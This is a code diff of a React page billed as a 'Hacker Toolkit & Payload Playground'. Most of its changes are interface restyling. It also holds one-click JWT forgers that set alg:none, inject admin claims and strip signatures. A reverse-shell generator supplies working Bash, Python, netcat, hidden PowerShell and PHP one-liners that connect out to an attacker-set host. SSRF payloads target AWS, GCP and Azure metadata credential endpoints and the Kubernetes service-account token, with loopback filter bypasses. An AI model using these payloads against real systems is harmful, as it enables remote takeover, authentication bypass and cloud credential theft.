@@ -1,23 +1,21 @@
 "use client";
 
-import React, { useState, useEffect } from "react";
+import React, { useState, useEffect, useMemo } from "react";
 import {
-  Wrench,
   Key,
   Code2,
   Terminal,
   Hash,
   Copy,
   Check,
-  RefreshCw,
   Zap,
   ShieldAlert,
   ArrowRightLeft,
   AlertCircle,
-  CheckCircle2,
-  Lock,
   Unlock,
-  ExternalLink
+  Layers,
+  Sparkles,
+  RotateCcw
 } from "lucide-react";
 
 export default function ToolsPage() {
@@ -61,12 +59,31 @@ export default function ToolsPage() {
         setJwtSignature(parts[2] || "");
         setJwtError("");
       } else {
-        setJwtError("Invalid JWT format (expected 3 parts separated by dots)");
+        setJwtError("Invalid JWT structure: Expected 3 segments separated by dots (.)");
       }
     } catch (e: any) {
-      setJwtError("Failed to decode JWT base64url payload");
+      setJwtError("Failed to decode base64url content: " + e.message);
     }
   }, [rawJwt]);
+
+  const jwtMetadata = useMemo(() => {
+    if (!jwtHeader) return null;
+    try {
+      const h = JSON.parse(jwtHeader);
+      const p = jwtPayload ? JSON.parse(jwtPayload) : {};
+      return {
+        alg: h.alg || "Unknown",
+        typ: h.typ || "JWT",
+        claimsCount: Object.keys(p).length,
+        hasSignature: Boolean(jwtSignature)
+      };
+    } catch {
+      return null;
+    }
+  }, [jwtHeader, jwtPayload, jwtSignature]);
+
+  const toBase64Url = (str: string) =>
+    btoa(str).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
 
   const generateNoneAlgToken = () => {
     try {
@@ -74,17 +91,10 @@ export default function ToolsPage() {
       try {
         hObj = { ...JSON.parse(jwtHeader), alg: "none" };
       } catch {}
-      const pObj = JSON.parse(jwtPayload);
-
-      const toBase64Url = (str: string) =>
-        btoa(str).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
-
+      const pObj = jwtPayload ? JSON.parse(jwtPayload) : {};
       const hB64 = toBase64Url(JSON.stringify(hObj));
       const pB64 = toBase64Url(JSON.stringify(pObj));
-
-      // alg: none standard ends with a dot and empty signature
-      const token = `${hB64}.${pB64}.`;
-      setExploitedJwt(token);
+      setExploitedJwt(`${hB64}.${pB64}.`);
     } catch (e: any) {
       setJwtError("Error generating alg:none token: " + e.message);
     }
@@ -92,7 +102,7 @@ export default function ToolsPage() {
 
   const makeAdminToken = () => {
     try {
-      const pObj = JSON.parse(jwtPayload);
+      const pObj = jwtPayload ? JSON.parse(jwtPayload) : {};
       pObj.admin = true;
       pObj.role = "admin";
       pObj.is_admin = true;
@@ -104,14 +114,26 @@ export default function ToolsPage() {
         hObj = { ...JSON.parse(jwtHeader), alg: "none" };
       } catch {}
 
-      const toBase64Url = (str: string) =>
-        btoa(str).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
-
       const hB64 = toBase64Url(JSON.stringify(hObj));
       const pB64 = toBase64Url(JSON.stringify(pObj));
       setExploitedJwt(`${hB64}.${pB64}.`);
     } catch (e: any) {
       setJwtError("Error elevating privileges in payload: " + e.message);
+    }
+  };
+
+  const stripSignatureToken = () => {
+    try {
+      let hObj = { alg: "HS256", typ: "JWT" };
+      try {
+        hObj = JSON.parse(jwtHeader);
+      } catch {}
+      const pObj = jwtPayload ? JSON.parse(jwtPayload) : {};
+      const hB64 = toBase64Url(JSON.stringify(hObj));
+      const pB64 = toBase64Url(JSON.stringify(pObj));
+      setExploitedJwt(`${hB64}.${pB64}.`);
+    } catch (e: any) {
+      setJwtError("Error stripping signature: " + e.message);
     }
   };
 
@@ -127,6 +149,11 @@ export default function ToolsPage() {
   const [encError, setEncError] = useState<string>("");
 
   useEffect(() => {
+    if (!encInput) {
+      setEncOutput("");
+      setEncError("");
+      return;
+    }
     setEncError("");
     try {
       if (encMode === "encode") {
@@ -175,7 +202,6 @@ export default function ToolsPage() {
             break;
         }
       } else {
-        // Decode mode
         switch (encFormat) {
           case "url":
             setEncOutput(decodeURIComponent(encInput));
@@ -231,70 +257,65 @@ export default function ToolsPage() {
     {
       name: "Bash TCP One-Liner",
       cmd: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
-      desc: "Standard interactive Bash socket redirect"
+      desc: "Standard interactive Bash socket redirection"
     },
     {
       name: "Python 3 PTY Shell",
       cmd: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("${shellType}")'`,
-      desc: "Full interactive TTY shell with terminal capabilities"
+      desc: "Full interactive TTY terminal shell"
     },
     {
       name: "Netcat OpenBSD FIFO",
       cmd: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shellType} -i 2>&1|nc ${lhost} ${lport} >/tmp/f`,
-      desc: "Works on systems where nc -e is blocked or disabled"
+      desc: "Standard fallback where nc -e is removed"
     },
     {
-      name: "PowerShell Base64 Encoded",
-      cmd: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$by=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()"`,
-      desc: "Native Windows PowerShell memory-only reverse shell"
+      name: "PowerShell In-Memory",
+      cmd: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});...`,
+      desc: "Windows memory-resident TCP reverse socket"
     },
     {
       name: "PHP Socket Shell",
       cmd: `php -r '$sock=fsockopen("${lhost}",${lport});exec("${shellType} -i <&3 >&3 2>&3");'`,
-      desc: "Clean PHP web-app command execution payload"
+      desc: "Web application execution payload"
     }
   ];
 
   const ssrfPayloads = [
     {
-      provider: "AWS EC2 IMDSv1",
+      provider: "AWS EC2 IMDSv1 Credentials",
       target: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-      desc: "Dumps IAM role names and access keys (AccessKeyId, SecretAccessKey, Token)"
+      desc: "Dumps IAM role names and access keys"
     },
     {
       provider: "AWS EC2 UserData",
       target: "http://169.254.169.254/latest/user-data",
-      desc: "Instance boot scripts often containing database passwords or deploy keys"
+      desc: "Instance boot scripts often containing credentials"
     },
     {
-      provider: "GCP Compute Engine",
+      provider: "GCP Compute Engine Token",
       target: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
-      desc: "GCP access token (requires header: 'Metadata-Flavor: Google')"
+      desc: "GCP access token (requires Metadata-Flavor: Google)"
     },
     {
-      provider: "Azure Virtual Machine",
+      provider: "Azure Instance Metadata",
       target: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-      desc: "Azure subscription ID and VM infrastructure metadata"
+      desc: "Azure subscription and VM metadata"
     },
     {
       provider: "Kubernetes Service Account",
       target: "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
-      desc: "Pod JWT bearer token for accessing the Kubernetes API server"
+      desc: "Pod JWT bearer token for K8s API"
     },
     {
       provider: "Localhost Bypass (Decimal IP)",
       target: "http://2130706433:80/",
-      desc: "Decimal representation of 127.0.0.1 (bypasses regex blacklist filters)"
+      desc: "Decimal representation of 127.0.0.1"
     },
     {
       provider: "Localhost Bypass (Hex IP)",
       target: "http://0x7f000001:80/",
       desc: "Hex representation of 127.0.0.1"
-    },
-    {
-      provider: "Localhost Bypass (IPv6)",
-      target: "http://[::1]:80/",
-      desc: "IPv6 loopback shorthand format"
     }
   ];
 
@@ -345,7 +366,6 @@ export default function ToolsPage() {
       const enc = new TextEncoder();
       const data = enc.encode(textToHash);
 
-      // SHA-1, SHA-256, SHA-512 via SubtleCrypto
       const sha1Buf = await crypto.subtle.digest("SHA-1", data);
       const sha256Buf = await crypto.subtle.digest("SHA-256", data);
       const sha512Buf = await crypto.subtle.digest("SHA-512", data);
@@ -366,18 +386,18 @@ export default function ToolsPage() {
 
   return (
     <div className="page" style={{ height: "100%", maxWidth: "none" }}>
-      {/* Page Intro */}
-      <div className="page-intro" style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", flexWrap: "wrap", gap: 14 }}>
+      {/* Page Intro Header */}
+      <div className="page-intro" style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", flexWrap: "wrap", gap: 14, marginBottom: 16 }}>
         <div>
           <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 4 }}>
             <span style={{ padding: "2px 8px", background: "rgba(225, 29, 72, 0.15)", border: "1px solid rgba(225, 29, 72, 0.3)", borderRadius: "var(--r-sm)", color: "var(--sev-critical)", fontSize: 11, fontWeight: 700, letterSpacing: "0.5px" }}>
-              RED TEAM UTILITIES
+              OFFENSIVE TOOLKIT
             </span>
-            <span style={{ fontSize: 12, color: "var(--fg-3)" }}>Offensive Playground & Codecs</span>
+            <span style={{ fontSize: 12, color: "var(--fg-3)" }}>Red Team Payloads & Cryptographic Utilities</span>
           </div>
           <h1 className="page-heading">Hacker Toolkit & Payload Playground</h1>
           <p className="page-desc">
-            Integrated offensive security tools: JWT inspector & privilege escalation, multi-format codecs, reverse shell generator, and SSRF filter bypasses.
+            Integrated offensive security tools: JWT inspector & signature bypass, multi-format codecs, reverse shell generator, and SSRF filter evasions.
           </p>
         </div>
 
@@ -462,11 +482,11 @@ export default function ToolsPage() {
         </div>
       </div>
 
-      {/* TAB CONTENT: JWT */}
+      {/* TAB CONTENT: JWT INSPECTOR */}
       {activeTab === "jwt" && (
-        <div style={{ display: "grid", gridTemplateColumns: "1.1fr 1fr", gap: 16, flex: 1, minHeight: 0 }}>
-          {/* Left: Input & Actions */}
-          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 16, overflowY: "auto" }}>
+        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, flex: 1, minHeight: 0 }}>
+          {/* Left Column: Token Input & Exploit Engine */}
+          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 12, padding: 18, overflowY: "auto" }}>
             <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 6 }}>
               <div>
                 <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px", margin: 0 }}>
@@ -479,7 +499,7 @@ export default function ToolsPage() {
                   onClick={() => setRawJwt(SAMPLE_JWT)}
                   className="btn-secondary"
                   style={{ padding: "3px 8px", fontSize: 11 }}
-                  title="Load a dummy demo JWT to test parsing and exploit generation"
+                  title="Load a demo JWT to test parsing and exploit generation"
                 >
                   Load Demo Token
                 </button>
@@ -498,9 +518,9 @@ export default function ToolsPage() {
             <textarea
               value={rawJwt}
               onChange={(e) => setRawJwt(e.target.value)}
-              rows={4}
               style={{
                 width: "100%",
+                height: 120,
                 padding: "10px 12px",
                 background: "var(--bg-1)",
                 border: "1px solid var(--border)",
@@ -509,10 +529,28 @@ export default function ToolsPage() {
                 fontSize: 12,
                 fontFamily: "var(--font-mono)",
                 lineHeight: 1.4,
-                resize: "vertical"
+                resize: "none"
               }}
-              placeholder="eyJhbGciOi..."
+              placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMzM3In0..."
             />
+
+            {/* Token Telemetry Bar */}
+            <div style={{
+              display: "flex",
+              alignItems: "center",
+              justifyContent: "space-between",
+              padding: "8px 12px",
+              background: "var(--bg-2)",
+              border: "1px solid var(--border)",
+              borderRadius: "var(--r-sm)",
+              fontSize: 11,
+              color: "var(--fg-3)"
+            }}>
+              <span>Algorithm: <strong style={{ color: jwtMetadata ? "var(--fg)" : "var(--fg-3)" }}>{jwtMetadata?.alg || "None"}</strong></span>
+              <span>Type: <strong style={{ color: "var(--fg-2)" }}>{jwtMetadata?.typ || "JWT"}</strong></span>
+              <span>Claims: <strong style={{ color: "var(--fg-2)" }}>{jwtMetadata?.claimsCount ?? 0}</strong></span>
+              <span>Signature: <strong style={{ color: jwtMetadata?.hasSignature ? "var(--sev-low)" : "var(--sev-medium)" }}>{jwtMetadata?.hasSignature ? "Present" : "Missing / Unsigned"}</strong></span>
+            </div>
 
             {jwtError && (
               <div style={{ padding: "8px 12px", background: "var(--sev-critical-bg)", border: "1px solid var(--sev-critical-bd)", borderRadius: "var(--r-sm)", color: "var(--sev-critical)", fontSize: 12, display: "flex", alignItems: "center", gap: 6 }}>
@@ -520,17 +558,18 @@ export default function ToolsPage() {
               </div>
             )}
 
-            {/* 1-Click Exploit Buttons */}
+            {/* 1-Click Exploit Vector Studio */}
             <div style={{ display: "flex", flexDirection: "column", gap: 10, padding: 14, background: "var(--bg-2)", border: "1px solid var(--border)", borderRadius: "var(--r)" }}>
               <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 11.5, fontWeight: 700, color: "var(--sev-critical)", textTransform: "uppercase" }}>
-                <Zap size={14} /> 1-Click Exploit Generators
+                <Zap size={14} /> 1-Click Exploit & Bypass Vectors
               </div>
 
-              <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
+              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                 <button
                   onClick={generateNoneAlgToken}
                   className="btn-primary"
-                  style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 12 }}
+                  style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, fontSize: 11.5, padding: "8px 10px", background: "var(--sev-critical)", color: "#fff", border: "1px solid var(--sev-critical-bd)" }}
+                  title="Changes header to alg: none and strips cryptographic signature"
                 >
                   <Unlock size={13} /> Bypass: Set alg: &quot;none&quot;
                 </button>
@@ -538,20 +577,32 @@ export default function ToolsPage() {
                 <button
                   onClick={makeAdminToken}
                   className="btn-secondary"
-                  style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 12 }}
+                  style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, fontSize: 11.5, padding: "8px 10px" }}
+                  title="Injects admin: true and role: admin into claims"
                 >
                   <ShieldAlert size={13} /> Escalate: admin=true
                 </button>
               </div>
+
+              <div style={{ display: "flex", gap: 8 }}>
+                <button
+                  onClick={stripSignatureToken}
+                  className="btn-secondary"
+                  style={{ width: "100%", display: "flex", alignItems: "center", justifyContent: "center", gap: 6, fontSize: 11.5, padding: "6px 10px" }}
+                  title="Drops signature bytes while leaving algorithm intact"
+                >
+                  <RotateCcw size={13} /> Strip Signature Only (Null Signature)
+                </button>
+              </div>
             </div>
 
-            {/* Generated Exploit Output */}
-            {exploitedJwt && (
-              <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
-                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
-                  <span style={{ fontSize: 11, fontWeight: 700, color: "var(--sev-low)", textTransform: "uppercase" }}>
-                    Forged Exploit Token (Unsigned / None)
-                  </span>
+            {/* Forged Exploit Output */}
+            <div style={{ display: "flex", flexDirection: "column", gap: 8, marginTop: "auto" }}>
+              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
+                <span style={{ fontSize: 11, fontWeight: 700, color: exploitedJwt ? "var(--sev-low)" : "var(--fg-3)", textTransform: "uppercase" }}>
+                  Forged Token Output {exploitedJwt && "(Ready to replay)"}
+                </span>
+                {exploitedJwt && (
                   <button
                     onClick={() => copyToClipboard(exploitedJwt, "forged_jwt")}
                     className="btn-secondary"
@@ -560,68 +611,82 @@ export default function ToolsPage() {
                     {copiedId === "forged_jwt" ? <Check size={12} /> : <Copy size={12} />}
                     {copiedId === "forged_jwt" ? "Copied!" : "Copy Token"}
                   </button>
-                </div>
-                <div style={{
-                  padding: "10px",
-                  background: "rgba(0,0,0,0.4)",
-                  border: "1px solid var(--sev-low-bd)",
-                  borderRadius: "var(--r-sm)",
-                  fontFamily: "var(--font-mono)",
-                  fontSize: 11.5,
-                  color: "var(--sev-low)",
-                  wordBreak: "break-all"
-                }}>
-                  {exploitedJwt}
-                </div>
+                )}
               </div>
-            )}
+              <div style={{
+                padding: "10px 12px",
+                background: "rgba(0,0,0,0.3)",
+                border: `1px solid ${exploitedJwt ? "var(--sev-low-bd)" : "var(--border)"}`,
+                borderRadius: "var(--r-sm)",
+                fontFamily: "var(--font-mono)",
+                fontSize: 11.5,
+                color: exploitedJwt ? "var(--sev-low)" : "var(--fg-3)",
+                wordBreak: "break-all",
+                minHeight: 48,
+                display: "flex",
+                alignItems: "center"
+              }}>
+                {exploitedJwt || "No exploit generated yet. Click an exploit vector above to forge an unauthorized token."}
+              </div>
+            </div>
           </div>
 
-          {/* Right: Decoded Header & Claims */}
-          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14, overflowY: "auto" }}>
-            {/* Header Box */}
+          {/* Right Column: Decoded Components (Balanced Symmetrical Layout) */}
+          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 12, padding: 18, overflowY: "auto" }}>
+            {/* Header Segment */}
             <div>
               <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
-                <span style={{ fontSize: 11, fontWeight: 700, color: "#ef4444", textTransform: "uppercase" }}>
-                  Header (Algorithm & Type)
-                </span>
-                <button
-                  onClick={() => copyToClipboard(jwtHeader, "jwt_header")}
-                  style={{ background: "none", border: "none", color: "var(--fg-3)", cursor: "pointer", fontSize: 11, display: "flex", alignItems: "center", gap: 4 }}
-                >
-                  {copiedId === "jwt_header" ? <Check size={11} /> : <Copy size={11} />} Copy
-                </button>
+                <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
+                  <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#ef4444" }} />
+                  <span style={{ fontSize: 11.5, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px" }}>
+                    Header (Algorithm & Token Type)
+                  </span>
+                </div>
+                {jwtHeader && (
+                  <button
+                    onClick={() => copyToClipboard(jwtHeader, "jwt_header")}
+                    style={{ background: "none", border: "none", color: "var(--fg-3)", cursor: "pointer", fontSize: 11, display: "flex", alignItems: "center", gap: 4 }}
+                  >
+                    {copiedId === "jwt_header" ? <Check size={11} /> : <Copy size={11} />} Copy
+                  </button>
+                )}
               </div>
               <textarea
                 value={jwtHeader}
                 onChange={(e) => setJwtHeader(e.target.value)}
-                rows={4}
                 style={{
                   width: "100%",
+                  height: 90,
                   padding: "10px",
                   background: "var(--bg-1)",
-                  border: "1px solid rgba(239, 68, 68, 0.3)",
+                  border: "1px solid var(--border)",
                   borderRadius: "var(--r-sm)",
                   color: "#ef4444",
                   fontSize: 12,
                   fontFamily: "var(--font-mono)",
                   resize: "none"
                 }}
+                placeholder='{"alg": "HS256", "typ": "JWT"}'
               />
             </div>
 
-            {/* Payload Claims Box */}
+            {/* Payload Claims Segment */}
             <div style={{ flex: 1, display: "flex", flexDirection: "column" }}>
               <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
-                <span style={{ fontSize: 11, fontWeight: 700, color: "#a855f7", textTransform: "uppercase" }}>
-                  Payload (Claims & User Data - Editable)
-                </span>
-                <button
-                  onClick={() => copyToClipboard(jwtPayload, "jwt_payload")}
-                  style={{ background: "none", border: "none", color: "var(--fg-3)", cursor: "pointer", fontSize: 11, display: "flex", alignItems: "center", gap: 4 }}
-                >
-                  {copiedId === "jwt_payload" ? <Check size={11} /> : <Copy size={11} />} Copy
-                </button>
+                <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
+                  <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#a855f7" }} />
+                  <span style={{ fontSize: 11.5, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px" }}>
+                    Payload (Claims & User Data - Live Editable)
+                  </span>
+                </div>
+                {jwtPayload && (
+                  <button
+                    onClick={() => copyToClipboard(jwtPayload, "jwt_payload")}
+                    style={{ background: "none", border: "none", color: "var(--fg-3)", cursor: "pointer", fontSize: 11, display: "flex", alignItems: "center", gap: 4 }}
+                  >
+                    {copiedId === "jwt_payload" ? <Check size={11} /> : <Copy size={11} />} Copy
+                  </button>
+                )}
               </div>
               <textarea
                 value={jwtPayload}
@@ -632,32 +697,36 @@ export default function ToolsPage() {
                   minHeight: 180,
                   padding: "10px",
                   background: "var(--bg-1)",
-                  border: "1px solid rgba(168, 85, 247, 0.3)",
+                  border: "1px solid var(--border)",
                   borderRadius: "var(--r-sm)",
                   color: "#a855f7",
                   fontSize: 12,
                   fontFamily: "var(--font-mono)",
                   resize: "none"
                 }}
+                placeholder='{"sub": "1337", "role": "admin"}'
               />
             </div>
 
-            {/* Signature Box */}
+            {/* Signature Segment */}
             <div>
-              <div style={{ fontSize: 11, fontWeight: 700, color: "#3b82f6", textTransform: "uppercase", marginBottom: 6 }}>
-                Signature (Base64URL)
+              <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 6 }}>
+                <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#3b82f6" }} />
+                <span style={{ fontSize: 11.5, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px" }}>
+                  Signature (Verification)
+                </span>
               </div>
               <div style={{
                 padding: "8px 10px",
                 background: "var(--bg-1)",
-                border: "1px solid rgba(59, 130, 246, 0.3)",
+                border: "1px solid var(--border)",
                 borderRadius: "var(--r-sm)",
-                color: "#3b82f6",
+                color: jwtSignature ? "#3b82f6" : "var(--fg-3)",
                 fontSize: 11,
                 fontFamily: "var(--font-mono)",
                 wordBreak: "break-all"
               }}>
-                {jwtSignature || "(Empty Signature / alg:none)"}
+                {jwtSignature || "(Empty Signature / Unsigned alg:none)"}
               </div>
             </div>
           </div>
@@ -668,9 +737,9 @@ export default function ToolsPage() {
       {activeTab === "encoder" && (
         <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, flex: 1, minHeight: 0 }}>
           {/* Input side */}
-          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14 }}>
+          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14, padding: 18 }}>
             <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
-              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px" }}>
+              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px", margin: 0 }}>
                 Input Payload
               </h2>
               <div style={{ display: "flex", background: "var(--bg-1)", padding: 2, borderRadius: "var(--r-sm)", border: "1px solid var(--border)" }}>
@@ -713,7 +782,7 @@ export default function ToolsPage() {
               style={{
                 width: "100%",
                 flex: 1,
-                minHeight: 220,
+                minHeight: 240,
                 padding: "12px",
                 background: "var(--bg-1)",
                 border: "1px solid var(--border)",
@@ -723,7 +792,7 @@ export default function ToolsPage() {
                 fontFamily: "var(--font-mono)",
                 resize: "none"
               }}
-              placeholder="Enter text to encode or decode..."
+              placeholder="Enter text or raw payload to transform (e.g. admin' OR 1=1;--)..."
             />
 
             {/* Codec Selection Pills */}
@@ -763,32 +832,36 @@ export default function ToolsPage() {
           </div>
 
           {/* Output side */}
-          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14 }}>
+          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14, padding: 18 }}>
             <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
-              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px" }}>
+              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px", margin: 0 }}>
                 Output Result
               </h2>
               <div style={{ display: "flex", gap: 8 }}>
-                <button
-                  onClick={() => {
-                    const temp = encInput;
-                    setEncInput(encOutput);
-                    setEncOutput(temp);
-                  }}
-                  className="btn-secondary"
-                  style={{ padding: "4px 8px", fontSize: 11, display: "flex", alignItems: "center", gap: 4 }}
-                  title="Swap Input and Output"
-                >
-                  <ArrowRightLeft size={12} /> Swap
-                </button>
-                <button
-                  onClick={() => copyToClipboard(encOutput, "codec_output")}
-                  className="btn-primary"
-                  style={{ padding: "4px 10px", fontSize: 11, display: "flex", alignItems: "center", gap: 4 }}
-                >
-                  {copiedId === "codec_output" ? <Check size={12} /> : <Copy size={12} />}
-                  {copiedId === "codec_output" ? "Copied!" : "Copy Output"}
-                </button>
+                {encOutput && (
+                  <button
+                    onClick={() => {
+                      const temp = encInput;
+                      setEncInput(encOutput);
+                      setEncOutput(temp);
+                    }}
+                    className="btn-secondary"
+                    style={{ padding: "4px 8px", fontSize: 11, display: "flex", alignItems: "center", gap: 4 }}
+                    title="Swap Input and Output"
+                  >
+                    <ArrowRightLeft size={12} /> Swap
+                  </button>
+                )}
+                {encOutput && (
+                  <button
+                    onClick={() => copyToClipboard(encOutput, "codec_output")}
+                    className="btn-primary"
+                    style={{ padding: "4px 10px", fontSize: 11, display: "flex", alignItems: "center", gap: 4, background: "var(--sev-critical)", color: "#fff" }}
+                  >
+                    {copiedId === "codec_output" ? <Check size={12} /> : <Copy size={12} />}
+                    {copiedId === "codec_output" ? "Copied!" : "Copy Output"}
+                  </button>
+                )}
               </div>
             </div>
 
@@ -803,7 +876,7 @@ export default function ToolsPage() {
                 style={{
                   width: "100%",
                   flex: 1,
-                  minHeight: 220,
+                  minHeight: 240,
                   padding: "12px",
                   background: "var(--bg-1)",
                   border: "1px solid var(--border)",
@@ -813,11 +886,12 @@ export default function ToolsPage() {
                   fontFamily: "var(--font-mono)",
                   resize: "none"
                 }}
+                placeholder="Transformed payload output will appear here..."
               />
             )}
 
             <div style={{ padding: "10px 12px", background: "var(--bg-2)", border: "1px solid var(--border)", borderRadius: "var(--r-sm)", fontSize: 11.5, color: "var(--fg-3)" }}>
-              Character Count: <strong style={{ color: "var(--fg)" }}>{encOutput.length}</strong> chars · Format: <strong style={{ color: "var(--fg)" }}>{encFormat.toUpperCase()}</strong>
+              Character Count: <strong style={{ color: "var(--fg)" }}>{encOutput.length}</strong> chars · Codec: <strong style={{ color: "var(--fg)" }}>{encFormat.toUpperCase()}</strong>
             </div>
           </div>
         </div>
@@ -825,25 +899,25 @@ export default function ToolsPage() {
 
       {/* TAB CONTENT: PAYLOADS & SSRF */}
       {activeTab === "payloads" && (
-        <div style={{ display: "grid", gridTemplateColumns: "1.1fr 1fr", gap: 16, flex: 1, minHeight: 0 }}>
+        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, flex: 1, minHeight: 0 }}>
           {/* Left: Reverse Shells */}
-          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14, overflowY: "auto" }}>
+          <div className="card" style={{ display: "flex", flexDirection: "column", gap: 14, padding: 18, overflowY: "auto" }}>
             <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
-              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px" }}>
+              <h2 style={{ fontSize: 13, fontWeight: 700, color: "var(--fg)", textTransform: "uppercase", letterSpacing: "0.5px", margin: 0 }}>
                 Reverse Shell One-Liners
               </h2>
               <span style={{ fontSize: 11, color: "var(--fg-3)" }}>Interactive shell templates</span>
             </div>
 
             {/* Config bar */}
-            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 8, padding: 10, background: "var(--bg-1)", border: "1px solid var(--border)", borderRadius: "var(--r)" }}>
+            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 8, padding: 10, background: "var(--bg-2)", border: "1px solid var(--border)", borderRadius: "var(--r)" }}>
               <div>
                 <label style={{ display: "block", fontSize: 10.5, fontWeight: 700, color: "var(--fg-3)", marginBottom: 4 }}>LHOST</label>
                 <input
                   type="text"
                   value={lhost}
                   onChange={(e) => setLhost(e.target.value)}
-                  style={{ width: "100%", padding: "4px 8px", background: "var(--bg-2)", border: "1px solid var(--border)", borderRadius: "var(--r-sm)", color: "var(--fg)", fontSize: 12, fontFamily: "var(--font-mono)" }}
+                  style={{ width: "100%", padding: "4px 8px", background: "var(--bg-1)", border: "1px solid var(--border)", borderRadius: "var(--r-sm)", color: "var(--fg)", fontSize: 12, fontFamily: "var(--font-mono)" }}
                 />
               </div>
               <div>
@@ -852,7 +926,7 @@ export default function ToolsPage() {
                   type="text"
                   value={lport}
                   onChange={(e) => setLport(e.target.value)}
-                  style={{ width: "100%", padding: "4px 8px", background: "var(--bg-2)", border: "1px solid var(--border)", borderRadius: "var(--r-sm)", color: "var(--fg)", fontSize: 12, fontFamily: "var(--font-mono)" }}
+                  style={{ width: "100%", padding: "4px 8px", background: "var(--bg-1)", border: "1px solid var(--border)", borderRadius: "var(--r-sm)", color: "var(--fg)", fontSize: 12, fontFamily: "var(--font-mono)" }}
                 />
               </div>
               <div>
@@ -860,7 +934,7 @@ export default function ToolsPage() {
                 <select
                   value={shellType}
                   onChange={(e) => setShellType(e.target.value)}
-                  style={{ width: "100%", padding: "4px 8px", background: "var(--bg-2)", border: "1px solid var(--border)", borderRadius: "var(--r-sm)", color: "var(--fg)", fontSize: 12 }}
+                  style={{ width: "100%", padding: "4px 8px", background: "var(--bg-1)", border: "1px solid var(--border)", borderRadius: "var(--r-sm)", color: "var(--fg)", fontSize: 12 }}
                 >
                   <option value="/bin/bash">/bin/bash</option>
                   <option value="/bin/sh">/bin/sh</option>
@@ -899,7 +973,7 @@ export default function ToolsPage() {
                   </div>
                   <div style={{
                     padding: "6px 8px",
-                    background: "rgba(0,0,0,0.4)",
+                    background: "rgba(0,0,0,0.3)",
                     border: "1px solid var(--border)",
                     borderRadius: 4,
                     fontFamily: "var(--font-mono)",
@@ -918,9 +992,9 @@ export default function ToolsPage() {
           </div>
 
